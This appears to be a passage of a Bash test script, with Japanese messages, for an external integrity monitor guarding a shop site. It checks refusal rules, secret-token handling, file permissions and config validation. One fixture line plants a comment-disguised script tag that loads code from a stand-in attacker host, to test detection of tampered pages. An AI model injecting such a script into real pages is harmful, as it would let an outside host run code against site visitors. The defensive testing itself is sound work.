put_status srv-a 2 false "image" true 0
run accept "$conf"
code_is 1 "busy で ok:false の時は accept を断る"
grep -qF "断りました" "$work/out" && ok "accept が断った理由を出す" || ng "accept が理由を出さない"
run accept "$conf" --force
code_is 0 "--force で越えられる"
put_status srv-a 2 true "" false -600
run accept "$conf"
code_is 1 "古い様子の時は accept を断る"
grep -qF "状態が古いままです" "$work/out" && ok "古い様子の理由を出す" || ng "古い様子の理由が無い"
good_status 2
BODY_EXTRA='<!--><script src="https://evil.example/h.js"></script>-->'
write_pages
run accept "$conf"
code_is 1 "隠れた要素がある時は accept を断る"
BODY_EXTRA=""
write_pages
run accept "$conf"
code_is 0 "何も無ければ accept できる"
"$bash_bin" "$sentinel" check "$conf" --force > "$work/out" 2>&1
[ $? = 2 ] && ok "check に --force は渡せない" || ng "check が --force を受けた"

# ---------- 11. 見張りの合い言葉 ----------
token="$(python3 -I -c 'import secrets; print(secrets.token_hex(16))')"
printf '%s\n' "$token" > "$work/token"
chmod 600 "$work/token"
sed "s#^STATE_DIR=.*#STATE_DIR=$work/state-token#" "$conf" > "$work/token.conf"
echo "SENTINEL_TOKEN_FILE=$work/token" >> "$work/token.conf"
: > "$work/requests"
: > "$work/curl-argv"
: > "$notified"
EC_SENTINEL_NOW="$NOW" "$bash_bin" "$sentinel" check "$work/token.conf" > "$work/out" 2>&1
[ "$(grep -c $'^/.well-known/ec-sugar/integrity.json\t'"$token" "$work/requests")" -ge 1 ] && ok "様子の取得に合い言葉の見出しを付ける" || ng "様子の取得に合い言葉が無い"
[ "$(grep -c $'^/.well-known/ec-sugar/integrity.json.sig\t'"$token" "$work/requests")" -ge 1 ] && ok "署名の取得にも合い言葉の見出しを付ける" || ng "署名の取得に合い言葉が無い"
if grep -v '^/.well-known/' "$work/requests" | q -F "$token"; then ng "ページの取得に合い言葉を付けた"; else ok "ページの取得には合い言葉を付けない"; fi
if grep -rqF "$token" "$work/out" "$work/state-token" "$notified" "$work/curl-argv"; then ng "合い言葉が記録・状態・知らせ・curl の引数に出た"; else ok "合い言葉を記録・状態・知らせ・curl の引数に出さない"; fi
: > "$work/requests"
check
grep -q $'^/.well-known/ec-sugar/integrity.json\t-\t' "$work/requests" && ok "合い言葉の設定が無ければ見出しを付けない" || ng "合い言葉の設定が無いのに見出しを付けた"
printf 'not-a-token-%s\n' "$token" > "$work/token"
EC_SENTINEL_NOW="$NOW" "$bash_bin" "$sentinel" check "$work/token.conf" > "$work/out" 2>&1
rc=$?
[ "$rc" = 2 ] && ! grep -qF "$token" "$work/out" && ok "形の違う合い言葉を中身を出さずに断る" || ng "形の違う合い言葉の扱い（${rc}）"
printf '%s\n' "$token" > "$work/token"
chmod 644 "$work/token"
EC_SENTINEL_NOW="$NOW" "$bash_bin" "$sentinel" check "$work/token.conf" > "$work/out" 2>&1
[ $? = 2 ] && grep -qF "0600" "$work/out" && ok "ほかの人が読める合い言葉のファイルを断る" || ng "0644 の合い言葉のファイルを断らない"

# ---------- 6. 設定と道具 ----------
grep -v "^ALLOW_HTTP" "$conf" > "$work/nohttp.conf"
EC_SENTINEL_NOW="$NOW" "$bash_bin" "$sentinel" check "$work/nohttp.conf" > "$work/out" 2>&1
rc=$?
[ "$rc" = 2 ] && grep -qF "https の URL にします" "$work/out" && ok "ALLOW_HTTP が無ければ http を断る" || ng "http を断らない（$rc: $(head -c 200 "$work/out")）"
printf 'STATUS_URL=https://x.example/i.json\nFOO=bar\n' > "$work/unknown.conf"
"$bash_bin" "$sentinel" check "$work/unknown.conf" > "$work/out" 2>&1
rc=$?
[ "$rc" = 2 ] && grep -qF "知らない名前 FOO" "$work/out" && ok "知らない設定を断る" || ng "知らない設定を断らない（${rc}）"
mkdir -p "$work/fakebin"
printf '#!/bin/sh\necho "LibreSSL 3.3.6"\n' > "$work/fakebin/openssl"
chmod +x "$work/fakebin/openssl"
OPENSSL="$work/fakebin/openssl" "$bash_bin" "$sentinel" check "$conf" > "$work/out" 2>&1
rc=$?
[ "$rc" = 2 ] && grep -qF "OpenSSL 3 以上ではありません" "$work/out" && ok "LibreSSL を断る" || ng "LibreSSL を断らない（$rc: $(head -c 200 "$work/out")）"
"$ossl" pkey -in "$work/other.pem" -pubout -out "$work/other.pub" 2> /dev/null
printf 'not a key\n' > "$work/bad.pub"
sed "s#^PUBLIC_KEY=.*#PUBLIC_KEY=$work/bad.pub#" "$conf" > "$work/badkey.conf"
"$bash_bin" "$sentinel" check "$work/badkey.conf" > "$work/out" 2>&1
rc=$?
[ "$rc" = 2 ] && grep -qF "Ed25519 の公開鍵" "$work/out" && ok "Ed25519 の公開の鍵でなければ断る" || ng "壊れた公開の鍵を断らない（${rc}）"

echo
if [ "$fails" -gt 0 ]; then
    echo "外の見張りの確かめ: NG $fails 件"
    exit 1
fi
echo "外の見張りの確かめ: すべて ok"
